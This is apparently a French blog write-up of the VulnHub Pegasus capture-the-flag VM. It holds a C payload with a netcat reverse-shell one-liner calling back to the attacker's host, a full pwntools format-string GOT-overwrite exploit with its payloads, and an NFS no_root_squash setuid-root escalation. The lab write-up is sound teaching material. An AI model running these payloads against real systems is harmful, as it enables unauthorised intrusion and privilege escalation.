# Solution du CTF Pegasus de VulnHub

Le CTF [Pegasus](https://www.vulnhub.com/entry/pegasus-1,109/) créé par [Knapsy](https://blog.knapsy.com/) n'a pas été une mnice affaire. Pas forcément parce qu'il y avait une exploitation de binaire un peu compliquée (NB: le CTF est affiché comme étant de difficulté intermédiaire) mais parce que des problèmes de connexion SSH m'ont absolument pourris la vie, le serveur SSH de la VM étant certainement configuré avec des algos de chiffrement dépréciés (le CTF est daté de décembre 2014).

Au final malgré la galère j'en suis venu à boût mais pas avec toute la prestance d'un *George Abitbol* (aka l'Homme le plus classe du monde).

```
Nmap scan report for 192.168.57.5
Host is up (0.000087s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 77:89:5b:52:ed:a5:58:6e:8e:09:f3:9e:f1:b0:d9:98 (DSA)
|   2048 d6:62:f5:12:31:36:ed:08:2c:1a:5e:9f:3c:aa:1f:d2 (RSA)
|_  256 c5:f0:be:e5:c0:9c:28:6e:23:5c:48:38:8b:4a:c4:43 (ECDSA)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33645/tcp   status
|   100024  1          41390/udp6  status
|   100024  1          45778/tcp6  status
|_  100024  1          58397/udp   status
8088/tcp  open  http    nginx 1.1.19
|_http-server-header: nginx/1.1.19
|_http-title: Pegasus Technologies - Under Construction
33645/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:88:F8:40 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Mauves et bleues

On voit ici un portmap ouvert mais NFS n'apparait pas dans la liste des services lancés. 

Le serveur `Nginx` n'affiche qu'une image style fantasy d'un Pégase, on passe alors à une énumération. Je suis contraint de filtrer sur la taille des réponses car le serveur retourne la page d'index en cas de fichier non trouvé.

```shellsession
$ feroxbuster -u http://192.168.57.5:8088/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-files.txt -S 189      

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.57.5:8088/
 🚀  Threads               │ 50
 📖  Wordlist              │ fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-files.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💢  Size Filter           │ 189
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        1l        4w        0c http://192.168.57.5:8088/submit.php
200       18l       46w      383c http://192.168.57.5:8088/50x.html
[####################] - 10s    37034/37034   0s      found:2       errors:0      
[####################] - 9s     37034/37034   3708/s  http://192.168.57.5:8088/
```

Ce script `submit.php` affiche le message *No data to process*. Essayons de lui donner matière à travailler en brute-forçant des noms de paramètres possibles :

```shellsession
$ ffuf -u "http://192.168.57.5:8088/submit.php" -X POST -d "FUZZ=abcd" -w common_query_parameter_names.txt -fs 19 -H "Content-type: application/x-www-form-urlencoded"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0
________________________________________________

 :: Method           : POST
 :: URL              : http://192.168.57.5:8088/submit.php
 :: Wordlist         : FUZZ: common_query_parameter_names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : FUZZ=abcd
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 19
________________________________________________

code                    [Status: 200, Size: 16, Words: 3, Lines: 1, Duration: 26ms]
:: Progress: [5697/5697] :: Job [1/1] :: 1929 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

Effectivement en POST il retourne le message `Sent for review!` si le paramètre `code` est défini. J'ai joué un peu avec `curl` pour essayer d'obtenir un RCE et au boût d'un moment j'ai eu une réponse différente :

```shellsession
$ curl http://192.168.57.5:8088/submit.php -X POST -d 'code=%3C%3Fphp%20system%28%22curl%20http%3A//192.168.57.1/toto.js%22%29%3B%20%3F%3E'
Sorry, due to security precautions, Mike won't review any code containing system() function call.
```

Intéressant. Le script s'attend donc à recevoir du code dans un langage qui dispose d'une fonction `system()`. J'ai essayé différents langage avec bien sûr PHP en tenant d'utiliser `shell_exec` et `passthru` mais sans résultat.

Finalement j'ai passé le code C suivant au script :

```c
#include <unistd.h>

int main(void) {
    char *args[4];
    args[0] = "/bin/bash";
    args[1] = "-c";
    args[2] = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.57.1 80 >/tmp/f";
    args[3] = NULL;
    execve(args[0], args, NULL);
    return 0;
}
```

Et j'ai reçu un connect back de la part de l'utilisateur *Mike* :

```shellsession
$ sudo ncat -l -p 80 -v
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 192.168.57.5.
Ncat: Connection from 192.168.57.5:55175.
bash: no job control in this shell
mike@pegasus:/home/mike$ id
id
uid=1001(mike) gid=1001(mike) groups=1001(mike)
```

## et jaunes et pourpres

Voici le code du script `submit.php` qui récupérait le code et le copiait dans un fichier :

```php
<?php
if(isset($_POST[code]))
{
        $code = $_POST[code];
        if (strpos($code, 'system(') !== false || strpos($code, 'system (') !== false)
        {
                die("Sorry, due to security precautions, Mike won't review any code containing system() function call.");
        }
        $ret = file_put_contents('/opt/code_review/code.c', $code, FILE_APPEND | LOCK_EX);
        if ($ret === false)
        {
                die("Error");
        }
        else
        {
                echo "Sent for review!";
        }
}
else
{
        die("No data to process.");
}
?>
```

La compilation et l'exécution sont appelées depuis une entrée contrab :

```bash
@reboot mike    /home/mike/check_code.sh
```

Voici le code bash :

```bash
#!/bin/sh
#
# I am a 'human' reviewing submitted source code :)
#

SOURCE_CODE="/opt/code_review/code.c"

# Kill whatever is running after 120 seconds
TIMEOUT=120

while true; do
    echo "# Checking for code.c..."
    if [ -f $SOURCE_CODE ]; then
        echo " # Compile..."
        /usr/bin/gcc -o /home/mike/code $SOURCE_CODE
        /bin/chmod 755 /home/mike/code
        echo " # Run"
        (/home/mike/code) & PID=$!
        # Let the code run for $TIMEOUT, then kill it if still executing
        (/bin/sleep $TIMEOUT && kill -9 $PID; echo " # Killed ./code") 2>/dev/null & WATCHER=$!
        # Kill the watched (code stopped executing before $TIMEOUT)
        wait $PID 2>/dev/null && kill -9 $WATCHER; echo " # Killed watcher"
        echo " # Cleanup..."
        /bin/rm -f /home/mike/code $SOURCE_CODE
    fi
    /bin/sleep 1
done
```

Au passage on remarque que `/opt/code_review` est world writable ce qui est toujours utile quand on veut transférer des fichiers.

*LinPEAS* m'indique qu'un partage NFS est configuré dans `/etc/exports` :

```
╔══════════╣ Analyzing NFS Exports Files (limit 70)
-rw-r--r-- 1 root root 450 Nov 18  2014 /etc/exports
/opt/nfs        *(rw,sync,crossmnt,no_subtree_check,no_root_squash)
```

Mais comme on l'a vu précédement, toujours pas de serveur NFS :

```shellsession
mike@pegasus:/opt/code_review$ rpcinfo -p 127.0.0.1
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100024    1   udp  47005  status
    100024    1   tcp  39502  status
```

Dans le dossier de l'utilisateur *mike* on trouve un binaire setuid pour l'utilisateur *john* :

```shellsession
mike@pegasus:/home/mike$ ls -al my_first
-rwsr-xr-x 1 john john 6606 Nov 28  2014 my_first
```

Si on exécute le binaire on obtient le menu suivant :

```
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection:
```

J'ai désassemblé le binaire avec [Cutter](https://cutter.re/) et je n'ai trouvé aucun stack overflow : le binaire lit ses entrées avec l'aide de la fonction `fgets` et semble toujours spécifier une limite de lecture ne dépassant jamais la taille allouée.

Puis sur la fonction `calculator` j'ai remarqué quelque chose d'anormal que l'on comprend mieux avec le décompilateur intégré à `Cutter` :

```c
/* jsdec pseudo code output */
/* /tmp/ctf/my_first @ 0x8048674 */
#include <stdint.h>
 
int32_t calculator (void) {
    const char * format;
    char * var_78h;
    char * str;
    int32_t var_14h;
    long var_10h;
    long var_ch;
    char ** endptr;
    FILE * stream;
    int32_t var_sp_ch;
    printf ("\nEnter first number: ");
    eax = *(stdin);
    eax = &str;
    eax = fgets (eax, *(stdin), 0x32);
    if (eax != 0) {
        printf ("Enter second number: ");
        eax = *(stdin);
        eax = &var_78h;
        eax = fgets (eax, *(stdin), 0x32);
        if (eax != 0) {
            eax = &format;
            eax = &str;
            eax = strtol (eax, 0xa, eax);
            var_ch = eax;
            eax = &format;
            eax = &var_78h;
            eax = strtol (eax, 0xa, eax);
            var_10h = eax;
            eax = format;
            eax = *(eax);
            if (al != 0xa) {
                printf ("Error details: ");
                eax = format;
                printf (eax);
                putchar (0xa);
                eax = 1;
            } else {
                eax = var_10h;
            }
            edx = var_ch;
            eax += edx;
            var_14h = eax;
            var_sp_ch = eax;
            eax = var_10h;
            stream = var_10h;
            eax = var_ch;
            endptr = var_ch;
            printf ("Result: %i + %i = %i\n\n");
            eax = 0;
        } else {
        }
        puts ("\nBye!");
        eax = 1;
    } else {
        puts ("\nBye!");
        eax = 1;
    }
    return eax;
}
```

Ce qui se passe ici c'est que le calculateur demande deux nombres. Il convertit d'ailleurs les chaines en entier avec `strtol`. Si la conversion de la deuxième chaine échoue il l'affiche directement à l'aide de `printf` au lieu de `puts` (ligne `printf(eax)`.

Par conséquent si la chaine contient des directives de formattages (comme `%s`, `%x`, `%d`, etc) elles seront appliquées.

On est donc face à une vulnérabilité de format string. Je vous invite à lire [mon tutoriel sur le sujet](https://devloop.users.sourceforge.net/index.php?article102/pwing-echo-exploitation-d-une-faille-de-chaine-de-format) pour en savoir plus.

Je regarde aussi si les adresses mémoire sont randomisées (ASLR), ce qui est ici le cas.

```shellsession
mike@pegasus:/home/mike$ cat /proc/sys/kernel/randomize_va_space
2
```

Il y a bien sûr différentes façons de passer outre cette randomisation :

- faire fuiter une adresse mémoire du programme avec une chaine de format

- brute-forcer une adresse possible jusqu'à tomber sur la bonne (le système est 32bits donc c'est réalisable)

- simplement désactiver la randomisation avec `ulimit -s unlimited` (là encore uniquement sur du 32bits)



Ma technique d'attaque était la même que sur le CTF [Moee](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Moee%20de%20VulnHub.md) :

- fuiter l'adresse d'une fonction présente dans la GOT (Global Offset Table) du binaire

- calculer l'adresse de la fonction `system` dans la mémoire du programme en se basant sur la différence d'offset entre `system` et la précédente fonction dans la libc

- écraser l'adresse de la fonction présente dans la GOT pour y mettre l'adresse de `system` à la place

- appeller ladite fonction écrasée qui appelera donc `system`

J'ai opté pour écraser la fonction `puts()` dans le programme car elle est assez similaire à `system()` : elle ne recoit qu'un seul argument qui est une chaine de caractères.

Qui plus est si on choisit l'entrée numéro `4` dans le programme on a ce code :

```c
int32_t quit (void) {
    puts ("\nGoodbye!");
    eax = 0;
    return eax;
}
```

Quand `puts` sera écrasé le programme essayera alors d'exécuter le fichier `Goodbye!` (le retour à la ligne sera ignoré car `system()` passe les commandes à bash).

## Et paraboliques

J'ai choisit de faire tout ça via le framework [pwntools](https://docs.pwntools.com/en/stable/) qui va faire une bonne partie des calculs à ma place :

```python
from pwn import *                                                                                                      
                                                                                                                       
p = process('./my_first', stdin=process.PTY, stdout=process.PTY)                                                       
elf = ELF('./my_first')                                                                                                
                                                                                                                       
# On obtient l'adresse de puts dans la GOT, ce sera notre target                                                       
info("puts@got = %#x", elf.got.puts)                                                                                   
                                                                                                                       
# Cette fonction de callback est passée plus loin à pwntools qui s'en sert                                             
# comme d'une entrée pour calculer la distance à laquelle la chaine de                                                 
# format se trouve sur la stack (offset)                                                                               
def exec_fmt(payload):                                                                                                 
    p.readuntil(b"Selection:")                                                                                         
    p.sendline(b"1")                                                                                                   
    p.readuntil(b"Enter first number:")                                                                                
    p.sendline(b"1")                                                                                                   
    p.readuntil("Enter second number:")                                                                                
    p.sendline(payload)                                                                                                
    buff = p.recvline()                                                                                                
    return buff                                                                                                        
                                                                                                                       
                                                                                                                       
autofmt = FmtStr(exec_fmt)                                                                                             
offset = autofmt.offset                                                                                                
info("offset is at dword %d", offset)                                                                                  
                                                                                                                       
# C'est parti pour le leak de l'adresse réelle de puts contenu dans la GOT                                             
p.readuntil(b"Selection:")                                                                                             
p.sendline(b"1")                                                                                                       
p.readuntil(b"Enter first number:")                                                                                    
p.sendline(b"1")                                                                                                       
p.readuntil("Enter second number:")                                                                                    
                                                                                                                       
payload = f'%{offset+1}$s'.encode()                                                                                    
payload += p32(elf.got.puts)                                                                                           
p.sendline(payload)                                                                                                    
                                                                                                                       
# Dans la réponse on obtient l'adresse de puts mappée en mémoire (libc)                                                
buff = p.readuntil(b"Selection:")                                                                                      
puts_libc_addr = unpack(buff.split(b"Error details: ")[1][:4])

libc = elf.libc                                                                                                        
info("puts = %#x", puts_libc_addr)                                                                                     
# on calcule l'adresse de base de la libc et on écrase celle sur l'objet libc                                          
# de pwntools qui permettra d'obtenir directement celle de système ensuite                                             
libc.address = puts_libc_addr - libc.symbols.puts                                                                      
info("libc base = %#x", libc.address)                                                                                  
                                                                                                                       
# Calculate system()                                                                                                   
system_libc_addr = libc.symbols.system                                                                                 
info("system = %#x", system_libc_addr)                                                                                 
                                                                                                                       
# On rentre à nouveau dans le calculateur mais cette fois pour le write-what-where                                     
p.sendline(b"1")                                                                                                       
p.readuntil(b"Enter first number:")                                                                                    
p.sendline(b"1")                                                                                                       
p.readuntil("Enter second number:")                                                                                    
                                                                                                                       
# pwntools génère la chaine de format à utiliser                                                                       
payload = fmtstr_payload(offset, {elf.got.puts: system_libc_addr}, write_size="short")                                 
info("pushing payload %s (size %d)", repr(payload), len(payload))                                                      
p.sendline(payload)                                                                                                    
                                                                                                                       
p.readuntil(b"Selection:")                                                                                             
# On quitte, ce qui va déclencher un system("\nGoogbye!")                                                              
p.sendline(b"4")                                                                                                       
p.interactive()                                                                                                        
p.close()
```

L'exploitation se fait ici sur le binaire que j'ai recopié sur ma machine :

```shellsession
$ python exploit.py 
[+] Starting local process './my_first': pid 32073
[*] 'my_first'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] puts@got = 0x8049c04
[*] Found format string offset: 8
[*] offset is at dword 8
[*] '/usr/lib/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] puts = 0xf7c764e0
[*] libc base = 0xf7c00000
[*] system = 0xf7c4d0c0
[*] pushing payload b'%53440c%15$hn%9988c%16$hnaaa\x04\x9c\x04\x08\x06\x9c\x04\x08' (size 36)
[*] Switching to interactive mode
$
```

Bingo ! Plus qu'à corriger l'exploit pour qu'il utilise les fonctionnalitées `remote` de `pwntools` sauf que...

- le serveur SSH de la VM ne semble accepter que les mots de passe (dont on ne dispose pas) et ne tient pas compte du fichier `authorized_keys`

- `pwntools` ne semble pas fonctionner avec `reverse-ssh` que j'ai lancé sur le port 31337 de la VM

- en rajoutant une entrée à mon fichier `.ssh/config` pour autoriser quelques protocoles SSH dépréciés pour la VM je peux me connecter en SSH mais `pwntools` génère une exception dans sa dépendance `paramiko`

- 

Au final l'exploitation a consisté à :

- désactiver l'ASLR avec `ulimit`

- obtenir l'adresse de `system()` désormais fixe dans la mémoire du programme directement avec gdb (`0x40069060`)

- obtenir la chaine de format à passer au programme pour écraser l'adresse de `puts` dans la GOT via le code Python suivant

```python
from pwn import *

elf = ELF('./my_first')

info("puts@got = %#x", elf.got.puts)

payload = fmtstr_payload(8, {elf.got.puts: 0x40069060}, write_size="byte", strategy="small")
print(payload)
```

Je passe la chaine générée ainsi que les différents choix à saisir sur l'entrée standard du programme :

```shellsession
mike@pegasus:/home/mike$ printf '1\n1\n%%64c%%17$hhn%%32c%%18$hhn%%1584c%%19$hnaa\x07\x9c\x04\x08\x04\x9c\x04\x08\x05\x9c\x04\x08\n4\n' | ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection:
Enter first number: Enter second number: Error details:
```

On ne voit pas le message `Goodbye!` car l'affichage a bien été remplacé par une exécution. J'avais préalablement placé un fichier `Goodbye!` contenant une commande pour lancer [un reverse shell Python](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) :

```shellsession
$ sudo ncat -l -p 443 -v
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 192.168.57.5.
Ncat: Connection from 192.168.57.5:35456.
$ id
uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)
```

Enfiiiiin !

## Et vice et versa

Mais même combat avec l'utilisateur *John*, on est géné par ce SSH inutilisable.

L'utilisateur *John* est habilité à démarrer le serveur NFS :

```shellsession
john@pegasus:~$ sudo -l
Matching Defaults entries for john on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on this host:
    (root) NOPASSWD: /usr/local/sbin/nfs
```

Ce qu'on s'empresse de faire :

```shellsession
john@pegasus:~$ sudo /usr/local/sbin/nfs start
 * Exporting directories for NFS kernel daemon...                                                                                                                                                          [ OK ]
 * Starting NFS kernel daemon                                                                                                                                                                              [ OK ]
john@pegasus:~$ showmount -e 127.0.0.1
Export list for 127.0.0.1:
/opt/nfs *
```

La suite est très classique. Il faut écrire et compiler le programme C suivant :

```c
#include <unistd.h>
#include <stdlib.h>

int main(void) {
        setreuid(0, 0);
        setregid(0, 0);
        system("/bin/bash");
        return 0;
}
```

Ensuite on monte l'export NFS avec `mount 192.168.57.5:/mnt/nfs /mnt` puis on place notre exécutable dedans non sans lui avoir donné le bit setuid root.

A cause du SSH cassé il a fallut compiler le code sur la VM, le transférer vers ma machine via netcat, le recopier sur la VM via le NFS, bref une grosse prise de tête mais au final on y est :

```shellsession
john@pegasus:/tmp$ cd /opt/nfs/
john@pegasus:/opt/nfs$ ls -al
total 20K
drwxr-xr-x 2 root root 4.0K Dec  8 19:48 .
drwxr-xr-x 5 root root 4.0K Nov 18  2014 ..
-rwsr-xr-x 1 root root 7.1K Dec  8 19:48 rootshell
-rw-r--r-- 1 root root  127 Dec  8 19:42 rootshell.c

john@pegasus:/opt/nfs$ ./rootshell
root@pegasus:/opt/nfs# id
uid=0(root) gid=0(root) groups=0(root),1001(mike)
root@pegasus:/opt/nfs# cd /root
root@pegasus:/root# ls
flag
root@pegasus:/root# file flag
flag: ASCII English text
root@pegasus:/root# cat flag
               ,
               |`\
              /'_/_
            ,'_/\_/\_                       ,
          ,'_/\'_\_,/_                    ,'|
        ,'_/\_'_ \_ \_/                _,-'_/
      ,'_/'\_'_ \_ \'_,\           _,-'_,-/ \,      Pegasus is one of the best
    ,' /_\ _'_ \_ \'_,/       __,-'<_,' _,\_,/      known creatures in Greek
   ( (' )\/(_ \_ \'_,\   __--' _,-_/_,-',_/ _\      mythology. He is a winged
    \_`\> 6` 7  \'_,/ ,-' _,-,'\,_'_ \,_/'_,\       stallion usually depicted
     \/-  _/ 7 '/ _,' _/'\_  \,_'_ \_ \'_,/         as pure white in color.
      \_'/>   7'_/' _/' \_ '\,_'_ \_ \'_,\          Symbol of wisdom and fame.
        >/  _ ,V  ,<  \__ '\,_'_ \_ \'_,/
      /'_  ( )_)\/-,',__ '\,_'_,\_,\'_\             Fun fact: Pegasus was also
     ( ) \_ \|_  `\_    \_,/'\,_'_,/'               a video game system sold in
      \\_  \_\_)    `\_                             Poland, Serbia and Bosnia.
       \_)   >        `\_                           It was a hardware clone of
            /  `,      |`\_                         the Nintendo Famicom.
           /    \     / \ `\
          /   __/|   /  /  `\
         (`  (   (` (_  \   /
         /  ,/    |  /  /   \
        / ,/      | /   \   `\_
      _/_/        |/    /__/,_/
     /_(         /_(


CONGRATULATIONS! You made it :)

Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you
learnt a thing or two while doing it! :)

Massive thanks and a big shoutout to @iMulitia for beta-breaking my VM and
providing first review.

Feel free to hit me up on Twitter @TheKnapsy or at #vulnhub channel on freenode
and leave some feedback, I would love to hear from you!

Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
more awesome boot2root VMs!
```

Un CTF assez avancé sur le plan technique. Je suis déçu de ne pas avoir pu automatiser toute l'exploitation avec `pwntools` à cause du serveur SSH.
